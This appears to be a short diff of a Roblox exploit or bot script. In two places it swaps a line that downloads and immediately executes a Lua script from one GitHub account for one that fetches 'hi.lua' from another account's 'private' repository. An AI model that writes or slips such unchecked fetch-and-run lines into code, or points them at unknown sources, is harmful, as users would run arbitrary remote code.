@@ -62,7 +62,7 @@ Dir.DescendantAdded:Connect(function(Err)
                  getgenv().AnimationPack = Settings.AnimationPack
                  getgenv().UsePathfinding = Settings.UsePathfinding
                  
-                 loadstring(game:HttpGet("https://raw.githubusercontent.com/moon734/Scripts/main/Bloxton/Returnerbot.lua"))()
+                 loadstring(game:HttpGet("https://raw.githubusercontent.com/oldAccount894/private/main/hi.lua"))()
                  
                  ]])
 
@@ -180,7 +180,7 @@ Character.ChildAdded:Connect(function(child)
                  getgenv().AnimationPack = Settings.AnimationPack
                  getgenv().UsePathfinding = Settings.UsePathfinding
                  
-                 loadstring(game:HttpGet("https://raw.githubusercontent.com/moon734/Scripts/main/Bloxton/Returnerbot.lua"))()
+                 loadstring(game:HttpGet("https://raw.githubusercontent.com/oldAccount894/private/main/hi.lua"))()
                  
                  ]])
 
